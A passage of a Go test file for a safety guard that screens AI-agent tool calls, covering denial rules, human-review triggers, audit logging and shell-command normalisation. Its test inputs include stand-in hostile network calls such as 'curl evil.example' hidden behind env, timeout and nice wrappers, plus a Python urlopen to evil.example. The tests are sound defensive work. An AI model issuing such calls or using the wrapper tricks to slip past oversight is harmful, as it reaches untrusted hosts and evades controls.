				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "resource.output_limit_exceeded",
		},
		{
			name: "background",
			req: Request{
				ToolName:   "execute_code",
				Backend:    BackendCodeExec,
				Background: true,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "process.background",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(tt.req, DefaultPolicy())
			if report.Decision != tt.decision || report.RuleID != tt.ruleID {
				t.Fatalf("unexpected report: %+v", report)
			}
		})
	}
}

func TestScanCodeExecShellAndNonShellBranches(t *testing.T) {
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "bash",
			Code:     "go test ./...",
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionAllow {
		t.Fatalf("bash code block should be allowed: %+v", report)
	}

	report = Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     "import urllib.request; urllib.request.urlopen('https://evil.example')",
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionDeny ||
		report.RuleID != "network.non_whitelisted_domain" {
		t.Fatalf("python network code block should be denied: %+v", report)
	}
}

func TestScanHighConcurrencyNeedsReview(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "printf jobs | xargs -P 64 -n 1 echo",
	}, DefaultPolicy())
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "resource.high_concurrency" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestScanFiveHundredCommands(t *testing.T) {
	command := strings.Repeat("go test ./...\n", 500)
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     command,
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionAllow {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func BenchmarkScanFiveHundredCommands(b *testing.B) {
	command := strings.Repeat("go test ./...\n", 500)
	req := Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     command,
		}},
	}
	policy := DefaultPolicy()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		Scan(req, policy)
	}
}

func TestAuditHelpersHandleNoopAndErrors(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
	}, DefaultPolicy())
	if err := WriteAuditJSONL(nil, report); err != nil {
		t.Fatalf("WriteAuditJSONL(nil) error = %v", err)
	}
	if err := AppendAuditFile("", report); err != nil {
		t.Fatalf("AppendAuditFile(empty) error = %v", err)
	}
	missingParent := filepath.Join(t.TempDir(), "missing", "audit.jsonl")
	if err := AppendAuditFile(missingParent, report); err == nil {
		t.Fatal("AppendAuditFile missing parent error = nil")
	}
}

func TestPermissionReasonWithoutEvidence(t *testing.T) {
	reason := permissionReason(Report{
		Decision:       DecisionDeny,
		Recommendation: "provide a command",
	})
	if !strings.Contains(reason, "tool safety guard deny") ||
		!strings.Contains(reason, "provide a command") {
		t.Fatalf("unexpected reason: %q", reason)
	}
}

func TestContainsPipelineIgnoresQuotedSeparators(t *testing.T) {
	if containsPipeline(`echo "a|b"`) {
		t.Fatal("double-quoted pipe should not count as pipeline")
	}
	if containsPipeline(`echo 'a;b'`) {
		t.Fatal("single-quoted semicolon should not count as pipeline")
	}
	if !containsPipeline("go test ./... && go vet ./...") {
		t.Fatal("&& should count as a command chain")
	}
}

func TestWriteAuditJSONLWritesOneRecord(t *testing.T) {
	var w countingWriter
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
	}, DefaultPolicy())
	if err := WriteAuditJSONL(&w, report); err != nil {
		t.Fatal(err)
	}
	if w.calls != 1 {
		t.Fatalf("Write calls = %d, want 1", w.calls)
	}
	if !bytes.HasSuffix(w.data, []byte("\n")) {
		t.Fatalf("audit record should end with newline: %q", w.data)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(w.data), &event); err != nil {
		t.Fatalf("audit record was not json: %v\n%s", err, string(w.data))
	}
	if event.Decision != DecisionAllow || event.ToolName != "workspace_exec" {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestUnwrapCommandVariants(t *testing.T) {
	tests := []struct {
		name string
		argv []string
		want []string
	}{
		{
			name: "env unset",
			argv: []string{"env", "-u", "TOKEN", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "env chdir",
			argv: []string{"env", "-C", "/tmp", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "env assignment",
			argv: []string{"env", "MODE=test", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "env without command",
			argv: []string{"env", "-u", "TOKEN"},
			want: nil,
		},
		{
			name: "env split string short",
			argv: []string{"env", "-S", "curl evil.example"},
			want: nil,
		},
		{
			name: "env split string long assignment",
			argv: []string{"env", "--split-string=curl evil.example"},
			want: nil,
		},
		{
			name: "command flags",
			argv: []string{"command", "-p", "--", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "command without command",
			argv: []string{"command", "-p"},
			want: nil,
		},
		{
			name: "timeout signal short",
			argv: []string{"timeout", "-s", "KILL", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "timeout kill after short",
			argv: []string{"timeout", "-k", "1", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "timeout signal long assignment",
			argv: []string{"timeout", "--signal=KILL", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "timeout without command",
			argv: []string{"timeout", "5"},
			want: nil,
		},
		{
			name: "nice adjustment short",
			argv: []string{"nice", "-n", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "nice adjustment long",
			argv: []string{"nice", "--adjustment", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "non wrapper",
			argv: []string{"go", "test", "./..."},
			want: []string{"go", "test", "./..."},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := unwrapCommand(tt.argv); !slices.Equal(got, tt.want) {
				t.Fatalf("unwrapCommand(%q) = %q, want %q", tt.argv, got, tt.want)
			}
		})
	}
}

func TestContainsNetworkCommandVariants(t *testing.T) {
	tests := []struct {
		name string
		argv []string
		want bool
	}{
		{
			name: "direct",
			argv: []string{"curl", "evil.example"},
			want: true,
		},
		{
			name: "Git SSH remote",
			argv: []string{"git", "clone", "git@evil.example:org/repo"},
			want: true,
		},
		{
			name: "Git local operation",
			argv: []string{"git", "status"},
			want: false,
		},
		{
			name: "env options and assignment",
			argv: []string{"env", "-u", "TOKEN", "-C", "/tmp", "MODE=test", "curl", "evil.example"},
			want: true,
		},
		{
			name: "command flags",
			argv: []string{"command", "-p", "curl", "evil.example"},
			want: true,
		},
		{
			name: "timeout short options",
			argv: []string{"timeout", "-s", "KILL", "-k", "1", "5", "curl", "evil.example"},
			want: true,
		},
		{
			name: "timeout long assignment",
			argv: []string{"timeout", "--signal=KILL", "5", "curl", "evil.example"},
			want: true,
		},
		{
			name: "nice short adjustment",
			argv: []string{"nice", "-n", "5", "curl", "evil.example"},
			want: true,
		},
		{
			name: "nice long adjustment",
			argv: []string{"nice", "--adjustment", "5", "curl", "evil.example"},
			want: true,
		},
		{
			name: "wrapper chain",
			argv: []string{"env", "MODE=test", "timeout", "5", "nice", "-n", "1", "command", "--", "curl", "evil.example"},
			want: true,
		},
		{
			name: "non wrapper",
			argv: []string{"go", "test", "./..."},
			want: false,
		},
		{
			name: "empty",
			argv: nil,
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := containsNetworkCommand(tt.argv); got != tt.want {
				t.Fatalf("containsNetworkCommand(%q) = %v, want %v", tt.argv, got, tt.want)
			}
		})
	}
}

func TestNormalizeShellScriptVariants(t *testing.T) {
	tests := []struct {
		name   string
		script string
		want   string
	}{
		{
			name:   "CRLF",
			script: "echo one\r\necho two",
			want:   "echo one ; echo two",
		},
		{
			name:   "escaped LF",
			script: "echo one\\\ntwo",
			want:   "echo one two",
		},
		{
			name:   "escaped CRLF",
			script: "echo one\\\r\ntwo",
			want:   "echo one two",
		},
		{
			name:   "newline in single quotes",
			script: "echo 'one\ntwo'",
			want:   "echo 'one two'",
		},
		{
			name:   "newline in double quotes",
			script: "echo \"one\ntwo\"",
			want:   "echo \"one two\"",
		},
		{
			name:   "blank line",
			script: "echo one\n\necho two",
			want:   "echo one ; echo two",
		},
		{
			name:   "leading blank lines",
			script: "\n\necho one",
			want:   "echo one",
		},
		{
			name:   "separator before newline",
			script: "echo one;\necho two",
			want:   "echo one;echo two",
		},
		{
			name:   "separator after newline",
			script: "echo one\n; echo two",
			want:   "echo one; echo two",
		},
		{
			name:   "pipe before newline",
			script: "echo one |\nwc -l",
			want:   "echo one |wc -l",
		},
		{
			name:   "trailing newline",
			script: "echo one\n",
			want:   "echo one",
		},
		{
			name:   "only newlines",
			script: "\r\n\n",
			want:   "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := normalizeShellScript(tt.script); got != tt.want {
				t.Fatalf("normalizeShellScript(%q) = %q, want %q", tt.script, got, tt.want)
			}
		})
	}
}

func TestPathCandidatesVariants(t *testing.T) {
	tests := []struct {
		name string
		arg  string
		want []string
	}{
		{name: "empty", arg: "   ", want: nil},
		{name: "ordinary", arg: " README.md ", want: []string{"README.md"}},
		{
			name: "option key value",
			arg:  `"--config=/etc/app"`,
			want: []string{"--config=/etc/app", "/etc/app"},
		},
		{name: "non option key value", arg: "MODE=test", want: []string{"MODE=test"}},
		{name: "empty option value", arg: "--config=", want: []string{"--config="}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := pathCandidates(tt.arg); !slices.Equal(got, tt.want) {
				t.Fatalf("pathCandidates(%q) = %q, want %q", tt.arg, got, tt.want)
			}
		})
	}
}

func TestHostOfVariants(t *testing.T) {
	tests := []struct {
		name string
		raw  string
		want string
	}{
		{name: "scheme less", raw: "evil.example/install.sh", want: "evil.example"},
		{name: "quoted scheme less", raw: `'LOCALHOST:8080/path'`, want: "localhost"},
		{name: "explicit scheme", raw: "https://API.GITHUB.COM/repos", want: "api.github.com"},
		{name: "bad URL", raw: "http://[::1", want: ""},
		{name: "empty", raw: "", want: ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := hostOf(tt.raw); got != tt.want {
				t.Fatalf("hostOf(%q) = %q, want %q", tt.raw, got, tt.want)
			}
		})
	}
}

type countingWriter struct {
	calls int
	data  []byte
}

type errorWriter struct{}

func (errorWriter) Write([]byte) (int, error) {
	return 0, errors.New("write failed")
}

func strconvQuote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func reportHasRule(report Report, ruleID string) bool {
	if report.RuleID == ruleID {
		return true
	}
	for _, finding := range report.Findings {
		if finding.RuleID == ruleID {
			return true
		}
	}
	return false
}

func (w *countingWriter) Write(p []byte) (int, error) {
	w.calls++
	w.data = append(w.data, p...)
	return len(p), nil
}
